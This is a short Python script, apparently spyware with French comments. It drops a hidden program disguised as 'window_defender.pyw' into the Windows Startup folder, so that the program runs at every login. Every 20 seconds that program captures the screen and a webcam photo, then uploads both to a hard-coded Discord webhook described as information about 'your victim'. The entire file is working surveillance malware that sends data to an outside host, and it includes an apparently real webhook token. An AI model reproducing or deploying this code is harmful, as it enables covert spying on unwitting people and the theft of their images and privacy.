import os
username = os.environ.get('USERNAME')
f=open(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\window_defender.pyw", "a")

script = r'''
#IMPORTER LES MODULES
import pyautogui
import os
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed
import time
import cv2
import win32gui, win32con
import pynput
from pynput.keyboard import Key, Listener

#RECUPERER LE USERNAME
username = os.environ.get('USERNAME')
#RECUPERER LA WEBHOOK
webhook_url = "https://discord.com/api/webhooks/866460368343007232/fAMWmqeUNBn47VtomldvywOqPI_bFbzXDQxXLFgXM2jskDWPANmquPi2fJiY1mLOEJpZ"
#CREE LA BOUCLE
while True:
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(fr'C:\Users\{username}\Desktop\screenshot_1.png')
    camera_port = 0
    camera = cv2.VideoCapture(camera_port)
    time.sleep(0.1)
    return_value, image = camera.read()
    cv2.imwrite(f"C:\\Users\\{username}\\Desktop\\screenshot_2.png", image)
    del (camera)  # so that others can use the camera as soon as possible

    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title='information', description='voici les informations sur votre victime', color='03b2f8')
    embed.set_thumbnail(url='https://images.ctfassets.net/bdm7zitnfa4i/pDHYKU8WbVpNtIm6966t9/8f9f5a3135b3830ee3a193132e5e7ceb/hacker-at-night.jpg?w=1800&q=50')
    with open(f"C:\\Users\\{username}\\Desktop\\screenshot_1.png", "rb") as f:
        webhook.add_file(file=f.read(), filename='../../Desktop/screenshot_1.png')

    with open(f"C:\\Users\\{username}\\Desktop\\screenshot_2.png", "rb") as f:
        webhook.add_file(file=f.read(), filename=f'C:\\Users\\{username}\\Desktop\\screenshot_2.png')

    webhook.add_embed(embed)
    response = webhook.execute()
    os.remove(f"C:\\Users\\{username}\\Desktop\\screenshot_1.png")
    os.remove(f"C:\\Users\\{username}\\Desktop\\screenshot_2.png")
    sleep(20)'''
f.write(script)